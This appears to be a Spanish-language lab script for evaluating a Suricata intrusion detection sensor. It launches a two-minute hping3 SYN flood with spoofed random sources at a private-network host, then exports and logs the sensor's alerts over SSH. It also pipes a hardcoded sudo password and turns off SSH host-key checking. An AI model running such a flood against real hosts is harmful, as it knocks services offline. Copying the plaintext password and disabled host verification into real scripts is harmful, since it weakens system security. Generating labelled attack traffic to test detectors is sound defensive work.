#!/usr/bin/env bash
set -euo pipefail

FECHA="$(date +%Y%m%d)"
GRUPO="anom"
ESCENARIO="synflood"
CORRIDA="01"
ORIGEN="192.168.0.100"
DESTINO="192.168.0.120"
HERRAMIENTA="hping3"
DURACION_SEGUNDOS=120
SENSOR="192.168.0.110"
PROJECT_ROOT_SENSOR="/home/m4rk/ppi-surikata-producto"
EXPORT_SCRIPT="${PROJECT_ROOT_SENSOR}/scripts/capture/exportar_eve_por_escenario.sh"
BITACORA_SCRIPT="${PROJECT_ROOT_SENSOR}/scripts/evaluation/registrar_bitacora.sh"
ARCHIVO_SALIDA="${FECHA}_${GRUPO}_${ESCENARIO}_${CORRIDA}_eve.json"

HORA_INICIO="$(date +%T)"
echo "Iniciando B1 SYN flood → ${DESTINO}:80 por ${DURACION_SEGUNDOS}s"

# hping3 necesita root para raw sockets
echo cisco123 | sudo -S timeout "$DURACION_SEGUNDOS" \
  hping3 -S -p 80 -i u5000 --rand-source "$DESTINO" 2>/dev/null || true

HORA_FIN="$(date +%T)"

ssh -o StrictHostKeyChecking=no m4rk@"$SENSOR" \
  "bash ${EXPORT_SCRIPT} ${FECHA} ${GRUPO} ${ESCENARIO} ${CORRIDA}"
ssh -o StrictHostKeyChecking=no m4rk@"$SENSOR" \
  "bash ${BITACORA_SCRIPT} ${GRUPO} ${ESCENARIO} ${ORIGEN} ${DESTINO} ${HORA_INICIO} ${HORA_FIN} ${HERRAMIENTA} ${ARCHIVO_SALIDA}"

echo "B1 completado | Inicio: $HORA_INICIO | Fin: $HORA_FIN | Archivo: $ARCHIVO_SALIDA"
